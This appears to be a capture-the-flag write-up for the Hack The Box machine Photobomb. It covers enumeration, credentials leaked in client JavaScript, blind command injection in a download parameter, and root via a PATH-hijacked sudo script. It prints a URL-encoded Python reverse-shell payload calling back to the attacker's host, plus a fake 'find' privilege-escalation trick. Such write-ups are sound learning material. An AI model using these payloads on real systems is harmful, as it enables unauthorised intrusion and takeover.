---
layout: post
title: PhotoBomb
description: Photobomb is an easy Linux machine where plaintext credentials are used to access an internal web application with a `Download` functionality that is vulnerable to a blind command injection.
categories: [writeups]
tags: [HTB, Command Injection, SUDO]
image:
  path: /assets/photobomb/Photobomb.png
---

## **Summary**

We accessed the web application using credentials found in a javascript file `photobomb.js`. The download functionality was vulnerable to a blind command injection.
As the user `wizard`, we were able to run `/opt/cleanup.sh` using sudo without a password, this script referenced a binary without its full path, which allowed us to
escalate our priviliges.

## **Enumeration**

### **nmap**

Initial nmap scan revealed two open ports:

- `80/tcp` : nginx 1.18.0
- `22/tcp` : OpenSSH 8.2p1

```
$ nmap 10.10.11.182 -sV
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-04 12:36 EDT
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.50 seconds
```

![](/assets/photobomb/01-nmap-version.png)

### **http**

The web server contains the following page:

![](/assets/photobomb/02-port-80-page.png)

I got a basic auth prompt after clicking on `click here!` button.

![](/assets/photobomb/03-port-80-basic-auth.png)

The `Debugger` from the developer tools revealed some credentials `ph0t0:b0Mb!`.

![](/assets/photobomb/04-port-80-basic-auth-creds.png)

I used those credentials to login.

![](/assets/photobomb/05-port-80-basic-auth-login.png)

The login was successful, so I was redirected to `/printer`.

![](/assets/photobomb/06-port-80-printer.png)

I scrolled to the bottom of the page, and found a download button that downloaded the `selected image` with the `filetype` and `dimensions` I selected.

![](/assets/photobomb/07-port-80-img-download.png)

I used `burpsuite` to intersept the request after clicking the `Download` button.

![](/assets/photobomb/08-port-80-download-req-burp.png)

I thought about command injection, so I played arround with the parameters `photo`, `filetype`, and `dimensions`, using the repeater tool

![](/assets/photobomb/09-port-80-download-req-burp-action.png)

The `photo` and `dimensions` came up empty, but not the `filetype`.

What got my attention is the error message when I set an invalid filetype

![](/assets/photobomb/10-port-80-invalid-filetype.png)

and when I inject a command.

![](/assets/photobomb/11-port-80-command-exec-poc.png)

## **Foothold**

I sat up a `netcat` listener on port `1337`

```
$ nc -lnvp 1337
```

![](/assets/photobomb/12-nc-listener.png)

After that, I went back to Burpsuite and injected the following command into the `filetype` parameter to get a reverse shell.

```
python3+-c+'import+socket,os,pty%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.14.37",1337))%3bos.dup2(s.fileno(),0)%3bos.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bpty.spawn("/bin/sh")'
```

![](/assets/photobomb/13-payload-burp.png)

I got no response back, but whe I went to my listener I had a reverse shell as the `wizard` user.

![](/assets/photobomb/14-rev-shell.png)

I changed directory to `/home/wizard` and got the user flag

![](/assets/photobomb/15-user-flag.png)

## **Privilege Escalation**

I checked if this user can run commands as sudo.

```
$ sudo -l
```

![](/assets/photobomb/16-sudo-l.png)

I opened `/opt/cleanup.sh` to see what it does.

```
$ cd /opt
$ ls -l
$ cat cleanup.sh
```

![](/assets/photobomb/17-opt-cleanup-sh.png)

The script is owned by `root` and I don't have write permission over it, so I could not change its content.

From the `sudo -l` output, I knew that I can run `/opt/cleanup.sh` as `root` without a password, and can also set environment variables.

At the last line of `cleanup.sh`, the `find` command is executed.

I created a costum `find` in the `/tmp`

```
$ cd /tmp
$ echo 'bash -p' > find
$ chmod +x find
```

![](/assets/photobomb/18-setup-fake-find.png)

I ran `/opt/cleanup.sh` with sudo, adding `/tmp` at the beginning of `PATH` so the `find` I created will be used instead of the original.

```
$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
```

![](/assets/photobomb/19-root-shell.png)

After the execution I got a root shell.

I moved to `/root` and got the root flag.
